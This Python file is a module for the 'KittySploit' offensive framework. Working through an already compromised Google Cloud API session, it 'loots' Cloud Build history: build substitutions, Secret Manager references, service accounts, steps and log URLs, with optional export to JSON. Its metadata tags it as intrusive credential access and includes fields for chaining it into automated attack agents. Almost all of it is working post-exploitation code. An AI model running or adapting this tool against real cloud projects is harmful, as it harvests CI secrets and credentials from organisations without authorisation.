#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import json

from kittysploit import *
from lib.post.gcp import GcpPostMixin


class Module(Post, GcpPostMixin):
    __info__ = {
        "name": "GCP Cloud Build History Loot",
        "description": "Extract Cloud Build history, substitutions, images, and secret references",
        "author": "KittySploit Team",
        "session_type": SessionType.GCP_API,
        "tags": ["gcp", "cloud", "cloud-build", "loot", "ci"],
    'agent': {
        'risk': 'intrusive',
        'effects': ['credential_access', 'api_request'],
        'expected_requests': 5,
        'reversible': False,
        'approval_required': True,
        'produces': ['credentials', 'risk_signals'],
        'cost': 1.5,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': [],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''}],
         'consumes_capabilities': ['shell'],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    max_builds = OptInteger(20, "Maximum builds to retrieve", False)
    include_steps = OptBool(True, "Include build step details", False)
    include_logs = OptBool(False, "Include build log URLs", False)
    mask_values = OptBool(True, "Mask substitution values in console output", False)
    export_json = OptString("", "Optional output JSON file", False)

    def run(self):
        try:
            project_id = self._gcp_project_id()
            if not project_id:
                print_error("Could not resolve project_id from session")
                return False

            builds = self._list_builds(project_id)
            if not builds:
                print_warning("No Cloud Build history found")
                return self.module_result(success=True, data={"builds": []})

            max_builds = max(1, int(self.max_builds or 20))
            loot = []

            print_info(f"Looting {min(len(builds), max_builds)} Cloud Build record(s)...")
            for build in builds[:max_builds]:
                build_id = str(build.get("id") or build.get("name") or "").rsplit("/", 1)[-1]
                status = build.get("status")
                entry = {
                    "id": build_id,
                    "status": status,
                    "createTime": build.get("createTime"),
                    "finishTime": build.get("finishTime"),
                    "source": build.get("source"),
                    "images": build.get("images") or [],
                    "substitutions": build.get("substitutions") or {},
                    "availableSecrets": build.get("availableSecrets"),
                    "serviceAccount": build.get("serviceAccount"),
                }
                if self.include_steps:
                    entry["steps"] = build.get("steps") or []
                if self.include_logs:
                    entry["logUrl"] = build.get("logUrl")

                print_info(f"Build {build_id} status={status}")
                substitutions = entry.get("substitutions") or {}
                if substitutions:
                    print_warning(f"  substitutions: {len(substitutions)}")
                    for key, value in substitutions.items():
                        print_info(f"    {key}={self._gcp_mask_value(value, mask=self.mask_values)}")
                if entry.get("availableSecrets"):
                    print_warning("  build references Secret Manager secrets")
                if entry.get("images"):
                    print_info(f"  images: {', '.join(entry['images'][:5])}")

                loot.append(entry)
                print_info("-" * 80)

            payload = {"project_id": project_id, "builds": loot}
            exported = self._gcp_export_json(self.export_json, payload) if self.export_json else ""
            if exported:
                print_success(f"Loot exported to {exported}")
            print_success(f"Processed {len(loot)} build(s)")
            return self.module_result(success=True, data=payload)
        except Exception as exc:
            print_error(f"Cloud Build history loot failed: {exc}")
            return False

    def _list_builds(self, project_id):
        quoted = self._quote_project(project_id)
        url = f"https://cloudbuild.googleapis.com/v1/projects/{quoted}/builds"
        max_builds = max(1, int(self.max_builds or 20))
        return self._gcp_paginate_get(url, "builds", max_items=max_builds, params={"pageSize": min(max_builds, 100)})
